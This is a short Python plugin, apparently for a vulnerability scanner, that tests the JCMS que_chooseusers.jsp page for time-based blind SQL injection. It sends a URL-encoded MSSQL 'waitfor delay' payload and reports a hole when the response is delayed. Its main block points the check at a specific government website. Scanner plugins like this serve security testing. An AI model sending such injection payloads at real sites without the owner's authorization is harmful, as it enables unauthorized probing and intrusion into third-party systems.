#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2014-076816
#__Author__ = Mr.R
#_PlugName_ = JCMS_SQL,que_chooseusers.jsp Plugin
import time


def assign(service, arg):
    if service == 'jcms':
        return True, arg

def audit(arg):

    ture_url = arg+'jcms/m_5_1/que_chooseusers.jsp?que_keywords=1'
    start_time1 = time.time()
    code1, head1, body1, errcode1, fina_url1 = curl.curl2(ture_url)
    ture_time = time.time()-start_time1


    flase_url = arg+'jcms/m_5_1/que_chooseusers.jsp?que_keywords=1%27%29%20waitfor%20delay%20%270%3A0%3A5%27%20--'
    start_time2 = time.time()
    code2, head2, body2, errcode2, fina_url2 = curl.curl(flase_url)
    flase_time = time.time()-start_time2

    if code1==200 and code2==200 and flase_time >ture_time and flase_time>5:
        security_hole('JCMS Que_chooseusers.jsp Time-Based Blind SQL Injection\n'+ture_url)

if __name__ == '__main__':
  from dummy import *
  audit(assign('jcms', 'http://www.wugang.gov.cn/')[1])